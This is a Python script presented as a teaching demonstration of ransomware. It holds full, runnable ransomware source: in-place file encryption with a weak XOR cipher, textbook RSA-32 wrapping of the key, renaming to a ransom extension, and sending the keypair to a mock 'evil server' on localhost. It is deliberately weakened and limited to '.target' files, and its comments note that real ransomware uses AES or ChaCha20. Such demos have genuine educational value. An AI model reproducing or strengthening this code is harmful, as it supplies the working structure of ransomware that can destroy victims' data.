#!/usr/bin/env python
#! coding: utf-8

import os
import math
import json
import socket
import itertools

'''
################################################################################
#                                                                              #
#                               DISCLAIMER                                     #
#                                                                              #
################################################################################
#                                                                              #
# THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESSED OR IMPLIED WARRANTIES,   #
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND #
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE       #
# REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,      #
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, #
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;  #
# OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,     #
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR      #
# OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF       #
# ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                                   #
#                                                                              #
################################################################################
'''


'''
Ransomware works by using symmetric encryption to "lock" its victim's files. 
The symmetric key is then encrypted using a two-part asymmetric key, the 
"decryption" half of which is sent to the malware author's server. 

This program will do just that, but without dumping ransom notes everywhere,
and without particularly advanced encryption. 

Please use responsibly.
'''



SYMMETRIC_KEY_LEN = 4    # bytes, bit-len cannot exceed asymmetric key len
ASYMMETRIC_KEY_LEN = 32  # bits = 4 bytes
RANSOM_EXTENSION = '.asdfyuio'

TARGETED_FILE_EXTENSIONS = '''
.target
'''.strip().split()





def symmetric_cryptor(key):
    '''
    Extremely simple 4-byte cyclic XOR cipher, not much different from Vigenere.
    For actual ransomware, AES-256 ciphers are used, or ChaCha20.
    
    the cipher works by repeatedly applying the key sequentially to the plaintext
    like this:
    
         PLAIN_TEXT
     xor KEYKEYKEYK
    ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
      =  b'\x1b\t\x18\x02\x0b\x06\x1f\x00\x01\x1f'
        
    This encryption is very weak and is only for demonstration purposes.
    '''
    key = itertools.cycle(key[:4])  # max key size is 4 bytes because of RSA-32.
    data = yield
    while True:
        if isinstance(data, bytes):
            data = bytes(b^k for b,k in zip(data, key))
        data = (yield data)
            

def isprime(p):
    # this only works because our numbers are so small. 
    if p == 2:
        return True
    if p % 2 == 0:
        return False
    for n in range(3, int(math.sqrt(p))+1, 2):
        if p % n == 0:
            return False
    return True

def get_rsa32_prime():
    '''
    Generates 16 bit primes for RSA-32 cryptosystem. start with random bytes, 
    then apply a bitmask setting the 16th bit to ensure it is a 16 bit number, 
    and the last bit, ensurng it is odd. two sixteen byte numbers multiplied 
    together make a 32 byte number.
    '''
    
    key_len = ASYMMETRIC_KEY_LEN // 2 // 8  
    p = int.from_bytes(os.urandom(key_len), 'big')
    p = p | 1<<(ASYMMETRIC_KEY_LEN // 2 - 1) | 1  # bit mask ensuring odd 16-bit number
    while not isprime(p):
        p += 2
    return p


def xgcd(a, b):
    """
    return (g, x, y) such that a*x + b*y = g = gcd(a, b) 
    https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm
    """
    x0, x1, y0, y1 = 0, 1, 1, 0
    while a != 0:
        q, b, a = b // a, a, b % a
        y0, y1 = y1, y0 - q * y1
        x0, x1 = x1, x0 - q * x1
    return b, x0, y0


def mulinv(a, b):
    """
    return x such that (x * a) % b == 1 
    https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm
    """
    g, x, _ = xgcd(a, b)
    if g == 1:
        return x % b



def gen_rsa_keys():
    '''
    quick generation of RSA-32 keys for encrypting messages that are
    exactly 32 bits long. This math is the hardest part of understanding RSA.
    '''
    # start with our primes
    p,q = get_rsa32_prime(), get_rsa32_prime()
    
    # in normal RSA, this number n is the *unfactorable* modulus
    # the length of the modulus also determines the maximum length of the message
    # to be encrypted. Exceeding the length would "wrap" the modulus more than once
    # and decrypted data will be corrupted.
    # If you ever factor n, you can repeat the below calculations, and find the 
    # private key d. This factoring problem is the only thing stopping modern 
    # RSA from breaking, so it is imperative that the original primes are strong
    # and random.
    n = p * q  
    
    e = 65537  # this is the public exponent
    
    
    # here we use Euler's totient φ(n) and the Extended Euclidean Algorithm to 
    # calculate the private exponent. There are multiple ways to do this.
    φ = (p-1) * (q-1)
    
    if math.gcd(e, φ) != 1:
        raise ValueError('Primality Error: e is not coprime to phi. Try again.')
        
    d = mulinv(e, φ)
    
    PUBLIC_KEY = (n, e)
    PRIVATE_KEY = (n, d)
    
    return (PRIVATE_KEY, PUBLIC_KEY)
    
    

def RSA32(data, key):
    '''
    it's actually RSA :O ("textbook RSA" that is).
    '''
    # key pair is (modulus, exponent)
    data = int.from_bytes(data, 'big')
    data = pow(data, key[1], key[0])
    data = data.to_bytes(SYMMETRIC_KEY_LEN, 'big')
    return data


def ransom_encrypt(filename, public_key):
    '''
    this function will encrypt files using symmetric encrpyption, then
    encrypt the symmetric key with RSA, and append the encrypted key to 
    the file.
    '''
    
    # we are going to do an in-place encryption to avoid copying the files.
    with open(filename, 'r+b') as f:
        # generate a one-time key
        symmetric_key = os.urandom(SYMMETRIC_KEY_LEN)
        cipher = symmetric_cryptor(symmetric_key)
        cipher.send(None)

        f.seek(0)
        for line in f:
            f.seek(-len(line), 1)
            line = cipher.send(line)
            f.write(line)

        symmetric_key = RSA32(symmetric_key, public_key)  # encrypt the key for later
        f.write(symmetric_key)

    os.rename(filename, filename + RANSOM_EXTENSION)
        
            
    
def ransom_decrypt(filename, private_key):
    '''
    Ususally this bit here will be a standalone executable with your
    private key embedded in it that the cybercriminal will send you to reverse 
    the encryption process, after you've paid the ransom of course.
    '''
    
    with open(filename, 'r+b') as f:
        f.seek(-SYMMETRIC_KEY_LEN, 2)
        symmetric_key = f.read()
        symmetric_key = RSA32(symmetric_key, private_key)
        cipher = symmetric_cryptor(symmetric_key)
        cipher.send(None)
        f.seek(0)
        for line in f:
            f.seek(-len(line), 1)
            line = cipher.send(line)
            f.write(line)
        
    os.truncate(filename, os.path.getsize(filename)- SYMMETRIC_KEY_LEN )  # remove old key
    os.rename(filename, filename[:-len(RANSOM_EXTENSION)])  # restore file name
    

def main():
    import time, sys  # optional modules only needed for the "experience"
    
    print('executing unpatched CVE to gain system privledges...')  # or a 0day if ur special
    print('connecting to tor hidden service...')
    time.sleep(5)
    print('generating RSA key pair')
    private_key, public_key = gen_rsa_keys()
    print('sending private key to evil server...')
    
    with socket.socket() as sender:
        sender.connect(('localhost', 31337))
        data = json.dumps({'keypair':(private_key, public_key)}).encode()
        sender.send(data)
        sender.shutdown(socket.SHUT_RDWR)

    print('wiping private key from memory')
    del private_key  # this doesn't work too good in python, but C++ works great!
    msg = 'HERE WE GOOOOOOOOOOOOOOOOOOOOOO'
    mi = iter(msg)
    for t in [1 / (2 * (x + 1)) for x in range(len(msg))]:
        print(next(mi), end='')
        sys.stdout.flush()
        time.sleep(t)
    print()  # \n
    
    print('encrypting files in the working directory...')
    for filename in os.listdir():
        for extension in TARGETED_FILE_EXTENSIONS:
            if filename.endswith(extension):
                ransom_encrypt(filename, public_key)
                break
    
    input('oh no your files are all messed up :( Press Enter to fix them :)')

    print('getting files from the server...')
    
    with socket.socket() as sender:
        sender.connect(('localhost', 31337))
        data = json.dumps({'pubkey':public_key}).encode()
        sender.send(data)
        private_key = json.loads(sender.recv(1024))
        sender.shutdown(socket.SHUT_RDWR)

    
    print('decrypting files in the working directory...')
    for filename in os.listdir():
        if filename.endswith(RANSOM_EXTENSION):
            ransom_decrypt(filename, private_key)

    input('Done. Press Enter to exit.')



if __name__ == '__main__':
    main()

